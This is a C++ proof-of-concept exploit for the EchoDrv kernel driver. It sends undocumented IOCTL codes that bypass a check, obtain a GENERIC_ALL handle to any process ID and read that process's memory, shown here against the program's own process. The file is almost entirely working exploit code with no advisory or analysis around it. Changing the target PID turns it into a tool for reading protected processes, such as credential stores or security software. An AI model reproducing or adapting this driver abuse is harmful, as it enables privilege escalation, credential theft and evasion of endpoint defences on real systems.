#include <windows.h>
#include <iostream>

HANDLE hDevice;

struct k_param_readmem {
    HANDLE targetProcess;
    void* fromAddress;
    void* toAddress;
    size_t length;
    void* padding;
    uint32_t returnCode;
};

struct k_param_init {
    void* first;
    void* second;
    void* third;
};

struct k_get_handle {
    DWORD pid;
    ACCESS_MASK access;
    HANDLE handle;
};

HANDLE getHandleForProcess(DWORD pid) {
    //Control Code - 0xe6224248

    k_get_handle param{};
    //Process ID to get handle for
    param.pid = pid;

    //Access to be granted on the returned handle
    param.access = GENERIC_ALL;

    //Do DeviceIoControl
    BOOL success = DeviceIoControl(hDevice, 0xe6224248, &param, sizeof(param), &param, sizeof(param), NULL, NULL);
    if (!success) {
        std::cout << "DeviceIOControl 0xe6224248 failed!" << std::endl;
        std::cout << "Error code: " << GetLastError() << std::endl;
    }

    //Return our yoinked handle
    return param.handle;
}

int main()
{
    //Test string to copy
    const char* test = "Hello world!!111";


    //Open driver handle
    hDevice = CreateFileA(
        "\\\\.\\EchoDrv",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );

    //If driver handle failed to open print message and return
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "Invalid handle on CreateFileA!" << std::endl;
        //Get the last error from windows for CreateFile
        std::cout << "Error code: " << GetLastError() << std::endl;
        return -1;
    }

    k_param_init init{};

    //Create a buffer to have data returned to.
    void* buf = (void*)malloc(4096);

    //Call IOCTL that sets the PID variable and gets past the dword check
    //0x9e6a0594 - Control Code
    BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 4096, NULL, NULL);
    if (!success) {
        std::cout << "DeviceIOControl 0x9e6a0594 failed!" << std::endl;
        std::cout << "Error code: " << GetLastError() << std::endl;
        return -1;
    }

    //We don't need that buffer anymore
    free(buf);

    //Abuse the driver to get a handle to an arbitrary process, in this case, our own process.
   HANDLE h = getHandleForProcess(GetCurrentProcessId());

   //If we failed to get the handle from the kernel driver just return and exit the program
   if (h == INVALID_HANDLE_VALUE) {
       std::cout << "Problem getting handle" << std::endl;
       return -1;
   }

   //Create an output buffer for our read call to the driver
    const char* output = (const char*)malloc(4096);

    k_param_readmem req{};
    req.fromAddress = (void*)test; //The address we're reading from - In this case, a char pointer, "Hello world!!111"
    req.length = strlen(test); //Get the length of the hello world string to copy
    req.targetProcess = h; //Our privileged handle we yoinked from the driver
    req.toAddress = (void*)output; //Where in our current process do we want to store the result

    std::cout << "making read ioctl" << std::endl;

    //Actually call the IOCTL on the driver to read the memory
    success = DeviceIoControl(hDevice, 0x60a26124, &req, sizeof(k_param_readmem), &req, sizeof(k_param_readmem), NULL, NULL);
    
    
   std::cout << "dic ret: " << success << std::endl;

   std::cout << "ioctl done ret code: " << req.returnCode << std::endl;

   std::cout << output << std::endl;

   return 0;
}
